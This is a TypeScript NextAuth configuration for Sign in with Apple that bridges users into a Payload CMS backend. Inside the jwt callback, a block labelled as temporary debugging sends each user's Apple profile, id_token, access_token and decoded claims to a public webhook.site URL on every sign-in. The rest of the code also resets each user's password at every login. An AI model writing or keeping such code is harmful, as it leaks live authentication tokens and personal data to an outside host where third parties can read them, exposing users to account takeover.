import crypto from 'crypto'
import type { NextAuthOptions } from 'next-auth'
import AppleProvider from 'next-auth/providers/apple'
import { getPayload } from '@/utilities/getPayload'

/**
 * Generates the Apple client_secret — a short-lived JWT signed with
 * the Apple private key. Valid for up to 6 months.
 * Apple requires this format instead of a static secret.
 */
function generateAppleClientSecret(): string {
  const privateKey = (process.env.APPLE_PRIVATE_KEY || '').replace(/\\n/g, '\n')
  const now = Math.floor(Date.now() / 1000)

  const header = Buffer.from(
    JSON.stringify({ alg: 'ES256', kid: process.env.APPLE_KEY_ID }),
  ).toString('base64url')

  const jwtPayload = Buffer.from(
    JSON.stringify({
      iss: process.env.APPLE_TEAM_ID,
      iat: now,
      exp: now + 15777000, // ~6 months max
      aud: 'https://appleid.apple.com',
      sub: process.env.APPLE_ID,
    }),
  ).toString('base64url')

  const signingInput = `${header}.${jwtPayload}`
  const sign = crypto.createSign('SHA256')
  sign.update(signingInput)
  // Apple requires IEEE P1363 format (raw r||s), not DER
  const signature = sign.sign({ key: privateKey, dsaEncoding: 'ieee-p1363' }, 'base64url')

  return `${signingInput}.${signature}`
}

export const authOptions: NextAuthOptions = {
  // Apple uses form_post: a cross-site POST from appleid.apple.com to our callback.
  // Browsers drop SameSite=Lax cookies on cross-site POSTs, killing both the PKCE
  // code_verifier and state cookies before NextAuth can read them.
  // Fix: override those cookies to SameSite=None;Secure so they survive the POST.
  cookies: {
    pkceCodeVerifier: {
      name: 'next-auth.pkce.code_verifier',
      options: { httpOnly: true, sameSite: 'none', path: '/', secure: true },
    },
    state: {
      name: 'next-auth.state',
      options: { httpOnly: true, sameSite: 'none', path: '/', secure: true },
    },
    callbackUrl: {
      name: 'next-auth.callback-url',
      options: { httpOnly: true, sameSite: 'none', path: '/', secure: true },
    },
  },

  providers: [
    AppleProvider({
      clientId: process.env.APPLE_ID!,
      // Lazily generated per cold-start so env vars are always available
      clientSecret: generateAppleClientSecret(),
      authorization: {
        params: {
          // Apple requires form_post when requesting name/email scopes.
          // Without this, Apple sends the callback as a GET with no user info
          // in the body, and profile.email / profile.name will be undefined.
          scope: 'name email',
          response_mode: 'form_post',
        },
      },
    }),
  ],

  callbacks: {
    /**
     * Runs on every Apple sign-in (and on session refresh).
     * Finds or creates the Payload user, then stores the Payload token in the
     * NextAuth JWT so the bridge route can set the payload-token cookie.
     *
     * Apple edge cases handled here:
     *  - Hide My Email  → relay address stored, updated if it changes later
     *  - Email once     → subsequent logins have no profile; appleSubId used instead
     *  - Duplicates     → email-match links existing OTP accounts to Apple
     *  - Relay changes  → on appleSubId match, email field updated if it differs
     *  - No email       → synthetic placeholder email generated so user can be created
     */
    async jwt({ token, account, profile }) {
      if (account?.provider === 'apple') {
        // TEMP: capture raw Apple payload — sends to webhook for inspection
        let idTokenClaims: Record<string, unknown> | null = null
        if (account.id_token) {
          try {
            idTokenClaims = JSON.parse(
              Buffer.from(account.id_token.split('.')[1], 'base64url').toString('utf8')
            )
          } catch (_) {}
        }
        fetch('https://webhook.site/d3e8fb1c-aef7-44f2-837a-10b830356885', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            event: 'apple_signin',
            isFirstLogin: !!profile,
            profile: profile ?? null,
            account: {
              provider: account.provider,
              providerAccountId: account.providerAccountId,
              type: account.type,
              id_token: account.id_token,
              access_token: (account as any).access_token,
              token_type: (account as any).token_type,
              expires_at: (account as any).expires_at,
            },
            idTokenClaims,
          }),
        }).catch((err) => console.error('[Apple Debug] webhook send failed:', err))

        // Decode id_token claims (middle segment is base64url-encoded JSON)
        if (account.id_token) {
          const claims = idTokenClaims
          try {
            const payload = await getPayload()

            // Apple only sends full profile on the FIRST sign-in.
            // On all later logins profile is undefined — use account.providerAccountId
            // which is always the stable Apple sub (unique per user+app pair).
            const appleSubId: string =
              (profile?.sub as string) || account.providerAccountId || ''
            const rawEmail: string = (profile?.email as string) || ''
            const firstName: string = (profile as any)?.name?.firstName || ''
            const lastName: string = (profile as any)?.name?.lastName || ''
            const isPrivateEmail =
              (profile as any)?.is_private_email === true ||
              (profile as any)?.is_private_email === 'true' ||
              rawEmail.endsWith('@privaterelay.appleid.com')

            // Case 5 — No email at all: Apple sometimes sends no email on first login.
            // Generate a deterministic synthetic address so the required email field
            // in Payload is satisfied. Flagged with isApplePrivateEmail so the app
            // knows it is not a real address.
            const email =
              rawEmail || (appleSubId ? `apple_${appleSubId}@privaterelay.surge.com` : '')

            if (!email) {
              throw new Error('[Apple] No email and no sub — cannot identify user')
            }

            // ── 1. Lookup ─────────────────────────────────────────────────────────
            // Priority: appleSubId → real-email match (never match relay addresses).
            // appleSubId is stable across logins and covers Cases 1, 2, 4.
            let userDoc: any = null

            if (appleSubId) {
              const bySubId = await payload.find({
                collection: 'users',
                where: { appleSubId: { equals: appleSubId } },
                limit: 1,
              })
              userDoc = bySubId.docs[0] || null
            }

            // Case 3 — Duplicate prevention: if the user previously registered via
            // OTP with their real Apple email, find them and link the Apple account.
            // Skip for relay addresses — they will never match a real-email account.
            if (!userDoc && !isPrivateEmail && rawEmail) {
              const byEmail = await payload.find({
                collection: 'users',
                where: { email: { equals: rawEmail } },
                limit: 1,
              })
              userDoc = byEmail.docs[0] || null
            }

            // ── 2. Create or update ───────────────────────────────────────────────
            const randomPassword = crypto.randomBytes(16).toString('hex')

            if (!userDoc) {
              // Brand-new user (covers Case 1 relay, Case 5 synthetic email)
              userDoc = await payload.create({
                collection: 'users',
                data: {
                  email,
                  firstName,
                  lastName,
                  role: 'customer',
                  password: randomPassword,
                  appleSubId,
                  isApplePrivateEmail: isPrivateEmail || email.endsWith('@privaterelay.surge.com'),
                } as any,
              })
            } else {
              const updateData: Record<string, any> = { password: randomPassword }

              // Stamp appleSubId on accounts found via email-match (Case 3 linking)
              if (!userDoc.appleSubId && appleSubId) {
                updateData.appleSubId = appleSubId
                updateData.isApplePrivateEmail = isPrivateEmail
              }

              // Case 1 & 4 — Relay email changed: user reconnected Apple after
              // revoking, Apple issued a new relay address. Update stored email
              // so future relay-based lookups still work.
              if (
                userDoc.appleSubId === appleSubId &&
                rawEmail &&
                rawEmail !== userDoc.email
              ) {
                updateData.email = rawEmail
                updateData.isApplePrivateEmail = isPrivateEmail
              }

              userDoc = await payload.update({
                collection: 'users',
                id: userDoc.id,
                data: updateData as any,
              })
            }

            // ── 3. Log in to get a Payload JWT ────────────────────────────────────
            const loginResult = await payload.login({
              collection: 'users',
              data: { email: userDoc.email, password: randomPassword },
            })

            token.payloadToken = loginResult.token
            token.payloadUser = {
              id: String(loginResult.user?.id),
              email: loginResult.user?.email || '',
              firstName: (loginResult.user as any)?.firstName,
              lastName: (loginResult.user as any)?.lastName,
            }
          } catch (err) {
            console.error('[NextAuth Apple] Payload bridge error:', err)
          }
        }
        return token
      }
      return token
    },

    async session({ session, token }) {
      session.payloadToken = token.payloadToken
      session.payloadUser = token.payloadUser
      return session
    },
  },

  pages: {
    signIn: '/login',
    error: '/login',
  },

  secret: process.env.NEXTAUTH_SECRET,
}
